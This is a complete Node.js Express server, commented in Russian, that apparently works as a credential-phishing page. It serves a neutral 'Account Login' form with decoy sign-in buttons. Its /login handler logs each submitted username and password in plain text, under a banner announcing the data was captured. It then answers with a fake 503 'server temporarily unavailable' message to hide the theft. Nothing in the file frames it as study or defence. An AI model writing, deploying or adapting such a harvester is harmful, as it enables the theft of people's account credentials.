const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// Обязательно: учим сервер читать данные из HTML-форм
app.use(express.urlencoded({ extended: true }));

// 1. ОТОБРАЖЕНИЕ СТРАНИЦЫ ДЛЯ ПОЛЬЗОВАТЕЛЯ
app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sign In</title>
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
            background-color: #22252a; /* Темный цвет фона страницы */
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }

        .auth-container { 
            background-color: #22252a; /* Цвет карточки совпадает с фоном для плоского стиля */
            padding: 30px; 
            border-radius: 4px; 
            width: 100%;
            max-width: 400px; 
            box-sizing: border-box;
        }

        /* Поля ввода */
        .input-control { 
            width: 100%; 
            padding: 12px 15px; 
            margin-bottom: 20px; 
            background-color: #2e3138; /* Серый цвет полей */
            border: 1px solid #40444f; 
            border-radius: 4px; 
            color: #ffffff; 
            font-size: 16px; 
            box-sizing: border-box; 
            transition: all 0.2s ease-in-out; 
        }
        .input-control::placeholder { color: #a0a5ab; }
        
        .input-control:focus { 
            outline: none; 
            border-color: #ffffff; 
            background-color: #353942;
        }
        
        /* Главная кнопка (Log In) */
        .btn-submit { 
            width: 100%; 
            padding: 12px; 
            background-color: transparent; 
            border: 1px solid #ffffff; 
            border-radius: 4px; 
            color: #ffffff; 
            font-size: 16px; 
            font-weight: 500; 
            cursor: pointer; 
            margin-bottom: 25px; 
            box-sizing: border-box;
            transition: background-color 0.2s ease, transform 0.1s ease; 
        }
        .btn-submit:hover { 
            background-color: rgba(255, 255, 255, 0.1); 
        }
        .btn-submit:active { 
            transform: scale(0.97); 
        }
        
        /* Дополнительные кнопки */
        .secondary-actions { 
            border-top: 1px solid #3f434a; 
            padding-top: 20px; 
            margin-top: 20px; 
        }
        
        .btn-secondary { 
            width: 100%; 
            padding: 14px; 
            background-color: #2e3138; 
            border: none; 
            border-radius: 4px; 
            color: #ffffff; 
            font-size: 15px; 
            font-weight: 500; 
            cursor: pointer; 
            margin-bottom: 12px; 
            text-align: center; 
            box-sizing: border-box;
            transition: background-color 0.2s ease, transform 0.1s ease; 
        }
        .btn-secondary:hover { 
            background-color: #383c45; 
        }
        .btn-secondary:active { 
            transform: scale(0.97); 
        }
        
        /* Контрастные и жирные текстовые ссылки */
        .link-text { 
            display: block; 
            text-align: center; 
            color: #ffffff; 
            font-size: 15px; 
            font-weight: 600; 
            text-decoration: none; 
            margin: 20px 0; 
            transition: color 0.2s; 
        }
        .link-text:hover { 
            text-decoration: underline; 
            color: #cbd5e1; 
        }
    </style>
</head>
<body>
<div class="auth-container">
    
    <!-- Нейтральный заголовок формы -->
    <h2 style="color: #ffffff; text-align: center; margin-top: 0; margin-bottom: 25px; font-size: 28px; font-weight: 700; letter-spacing: -0.5px;">
        Account Login
    </h2>
    
    <form action="/login" method="POST">
        <input type="text" name="username" class="input-control" placeholder="Username / Email" required>
        <input type="password" name="password" class="input-control" placeholder="Password" required>
        <button type="submit" class="btn-submit">Log In</button>
    </form>

    <a href="#" class="link-text">Forgot password?</a>
    
    <div class="secondary-actions">
        <button type="button" class="btn-secondary">One-Time Code Sign-In</button>
        <button type="button" class="btn-secondary">Quick Access</button>
    </div>
    
    <a href="#" class="link-text" style="margin-top: 20px;">Create an account</a>
</div>
</body>
</html>
    `);
});

// 2. БЭКЕНД: ПРИЕМ ДАННЫХ И ИХ ЗАПИСЬ В ОНЛАЙН-ЛОГИ
app.post('/login', (req, res) => {
    const userLogin = req.body.username;
    const userPassword = req.body.password;
    
    console.log(`\n========================================`);
    console.log(`[БЭКЕНД] ДАННЫЕ УСПЕШНО ЗАФИКСИРОВАНЫ:`);
    console.log(`ЛОГИН: ${userLogin}`);
    console.log(`ПАРОЛЬ: ${userPassword}`);
    console.log(`========================================`);
    
    res.status(503).send('Сервер временно недоступен. Пожалуйста, попробуйте войти позже.');
});

app.listen(PORT, () => {
    console.log("=== СЕРВЕР УСПЕШНО ЗАПУЩЕН ===");
});
